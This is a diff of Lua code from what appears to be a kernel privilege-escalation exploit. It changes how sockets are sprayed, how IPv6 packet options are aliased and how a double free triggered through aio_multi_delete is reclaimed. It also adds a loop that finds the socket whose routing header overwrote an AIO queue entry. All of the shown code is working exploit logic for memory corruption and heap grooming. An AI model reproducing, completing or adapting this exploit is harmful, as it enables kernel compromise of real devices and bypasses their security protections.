@@ -1208,12 +1208,12 @@ function make_aliased_pktopts(sds)
 
     for loop = 1, NUM_ALIAS do
 
-        for i=1, #sds do
+        for i=1, NUM_SDS do
             memory.write_dword(tclass, i)
             ssockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass, 4)
         end
 
-        for i=1, #sds do
+        for i=1, NUM_SDS do
             gsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass, 4)
             local marker = memory.read_dword(tclass):tonumber()
             if marker ~= i then
@@ -1233,7 +1233,7 @@ function make_aliased_pktopts(sds)
             end
         end
 
-        for i=1, #sds do
+        for i=1, NUM_SDS do
             ssockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0)
         end
     end
@@ -1370,21 +1370,35 @@ function double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd, sds, fake_
     memory.write_dword(target_ids, req_id)
     memory.write_dword(target_ids+4, target_id)
 
-    -- NOTE: we cant use existing `sds` because we dont know which one is reclaimed/dirty
-    local new_sds = {}
-    for i=1,48 do
-        table.insert(new_sds, new_socket())
-    end
-
     -- PANIC: double free on the 0x100 malloc zone. important kernel data may alias
     aio_multi_delete(target_ids, 2, sce_errs)
+
+    for j=1, NUM_SDS do
+        local sd2 = sds[j]
+        get_rthdr(sd2, reqs2, rsize)
+        local ticket = memory.read_dword(reqs2 + 4):tonumber()
+        if ticket == 4 then
+            print(memory.hex_dump(reqs2, rsize))
+            sd = sd2
+            table.remove(sds, j)
+            free_rthdrs(sds)
+            table.insert(sds, new_socket())
+            break
+        end
+    end
+
+    if sd == nil then
+        error("can't find sd that overwrote AIO queue entry")
+    end
+
+    dbgf("sd: %d", sd)
 
     -- we reclaim first since the sanity checking here is longer which makes it
     -- more likely that we have another process claim the memory
     
     -- RESTORE: double freed memory has been reclaimed with harmless data
     -- PANIC: 0x100 malloc zone pointers aliased
-    local sd_pair = make_aliased_pktopts(new_sds)
+    local sd_pair = make_aliased_pktopts(sds)
 
     local err1 = memory.read_dword(sce_errs):tonumber()
     local err2 = memory.read_dword(sce_errs+4):tonumber()
